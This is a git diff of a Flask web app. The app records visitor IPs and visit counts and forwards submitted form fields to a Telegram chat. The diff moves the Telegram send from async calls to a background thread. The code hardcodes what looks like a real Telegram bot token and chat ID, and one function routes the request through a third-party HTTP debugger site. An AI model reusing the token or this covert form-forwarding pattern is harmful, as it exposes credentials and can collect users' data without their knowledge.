@@ -2,6 +2,7 @@ from flask import Flask, render_template, request , jsonify
 import Db
 import requests
 import jdatetime
+from threading import Thread
 from pytz import timezone
 
 DaysOfWeek = {
@@ -12,16 +13,17 @@ Months = {
 }
 
 
-async def SendMessageToTelegramDirect(Message):
-   req = await requests.get("https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message)
+def SendMessageToTelegramDirect(Message):
+   req = requests.get("https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message)
    return req
 
-async def SendMessageToTelegramIndirect(Message):
+def SendMessageToTelegramIndirect(Message):
+
     settings = {
         "UrlBox": "https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message,
         "MethodList": "POST"
     }
-    req = await requests.post(
+    req = requests.post(
         "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", settings)
     return req
 
@@ -29,7 +31,7 @@ async def SendMessageToTelegramIndirect(Message):
 app = Flask(__name__ , template_folder=".")
 
 
-async def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
+def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
     message = f"""
     کاربر شماره: {id}
     کد اشتراکی دریافتی از ادمین:
@@ -51,7 +53,7 @@ async def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
         {submited} بار فیلد هارو پر کرده 
         {time} {day} {DayOfMonth} {Month} 
         """
-    await SendMessageToTelegramIndirect(message)
+    SendMessageToTelegramDirect(message)
 
 def ipaddress(request):
     try:
@@ -64,7 +66,7 @@ def ipaddress(request):
         print(f"Error getting ipaddress : {err}")
 
 @app.route('/', methods=['GET', 'POST'])
-async def form_page():
+def form_page():
     # Ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
     Ip = ipaddress(request)
     # IsFromIran = True  # For Debug
@@ -81,7 +83,7 @@ async def form_page():
             Field3 = data.get('Field3')
             Db.AddOrUpdate(Ip , Scode)
             User = Db.GetUserByIP(Ip)
-            await  SendToTelegram(Field1,Field2,Field3,User[1],User[2],User[0])
+            Thread(target= lambda:SendToTelegram(Field1,Field2,Field3,User[1],User[2],User[0])).start()
             return "Ok"
     finally:
         Db.onVisitEvent(Ip)
